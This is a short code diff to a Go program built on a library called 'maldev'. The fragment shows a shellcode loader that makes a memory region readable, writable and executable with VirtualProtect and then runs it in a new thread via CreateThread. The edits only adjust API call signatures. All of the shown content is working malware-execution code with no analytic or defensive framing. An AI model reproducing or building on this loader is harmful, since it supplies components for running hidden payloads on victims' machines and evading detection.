@@ -56,7 +56,7 @@ func main() {
 	maldev.Memset(unsafe.Pointer(&decrypted[0]), 0, maldev.SIZE_T(len(decrypted)))
 
 	var dwOldProtection maldev.DWORD
-	_, err = maldev.VirtualProtect(addr, maldev.SIZE_T(len(decrypted)), maldev.PAGE_EXECUTE_READWRITE, &dwOldProtection)
+	err = maldev.VirtualProtect(addr, maldev.SIZE_T(len(decrypted)), maldev.PAGE_EXECUTE_READWRITE, &dwOldProtection)
 	if err != nil {
 		fmt.Printf("[!] VirtualProtect Failed With Error : %s \n", err)
 		return
@@ -64,7 +64,7 @@ func main() {
 	fmt.Printf("[#] Press <Enter> To Run ... ")
 	fmt.Scanln()
 
-	_, err = maldev.CreateThread(0, 0, maldev.LPTHREAD_START_ROUTINE(addr), 0, 0, nil)
+	_, err = maldev.CreateThread(maldev.NULL, maldev.NULL, maldev.LPTHREAD_START_ROUTINE(addr), maldev.NULL, maldev.NULL, nil)
 	if err != nil {
 		fmt.Printf("[!] CreateThread Failed With Error : %s \n", err)
 		return
